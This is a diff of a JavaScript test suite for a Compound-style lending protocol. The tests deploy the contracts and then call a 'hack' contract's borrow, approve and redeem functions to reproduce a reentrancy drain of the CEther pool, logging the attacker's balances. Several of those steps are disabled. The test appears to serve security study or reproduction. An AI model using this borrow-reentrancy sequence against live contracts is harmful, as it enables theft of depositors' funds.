@@ -30,6 +30,8 @@ describe('DappDeployment and initialization', () => {
             unitroller = await Unitroller.new({from:EOAboss});
             cunitroller = await Comptroller.at(unitroller.address);
             assert.equal(await unitroller.admin.call(), accounts[1]);
+            balance = await web3.eth.getBalance(accounts[0]);
+            console.log('owner balance', web3.utils.fromWei(balance, "ether"));
         })
 
         it('should deploy comptroller logic/implementation', async () => {
@@ -137,6 +139,11 @@ describe('DappDeployment and initialization', () => {
                 assert.isAtLeast(parseInt(x), 0);
                 assert.equal(await web3.eth.getBalance(cetherdelegator.address), web3.utils.toWei('10', 'ether'));
             })
+            
+            it('should mint cether from another account to add eth balance to Cether', async () => {
+                await cetherdelegator.mint({value: web3.utils.toWei('15', 'ether'), from: accounts[3]});
+                console.log('cether contract balance after accounts[3] mint: %s', await web3.eth.getBalance(cetherdelegator.address));
+            })
 
             it('should borrow eth for CEth', async() => {
                 await hack.callBorrow();
@@ -145,18 +152,38 @@ describe('DappDeployment and initialization', () => {
 
             })
 
-            it('should call borrow again', async () => {
+            it('should check cether and hacker cether allowance', async () => {
+                balance = await cetherdelegator.balanceOf(hack.address);
+                console.log('hack address cether balance', web3.utils.fromWei(balance, "ether"));
+                allowance = await cetherdelegator.allowance(hack.address, cether);
+                //console.log('allowance', web3.utils.fromWei(allowance, "ether"));
+                await hack.callApprove();
+                allowance = await cetherdelegator.allowance(hack.address, cether);
+                console.log('allowance', web3.utils.fromWei(allowance, "ether"));
+
+            })
+
+
+            xit('should call borrow again', async () => {
                 await hack.callBorrow();
             })
 
-            it('should return hacker balance afeter reentrancy', async () => {
+            xit('should return hacker balance afeter reentrancy', async () => {
                 console.log('hacker eth balance after borrow is: %s', await web3.eth.getBalance(hack.address));
                 console.log('hacker CEth contract balance after borrow is %s', web3.utils.fromWei(await hack.getCEthBalance.call(), "ether"));
             })
 
-            it('should repayBorrow', async () => {
+            xit('should repayBorrow', async () => {
                 //await hack.callrepayBorrow();
                 //console.log('hacker balance after repay is: %s', await web3.eth.getBalance(hack.address));
+            })
+            
+            xit('should redeemUnderlying', async () => {
+                await hack.callRedeemUnderlying();
+                console.log('hacker address balance after redemption', await web3.eth.getBalance(hack.address));
+                balance = await web3.eth.getBalance(accounts[0]);
+                console.log('owner balance', web3.utils.fromWei(balance, "ether") );
+                console.log('cether contract balance after redemption: %s', await web3.eth.getBalance(cetherdelegator.address));
             })
 
         })
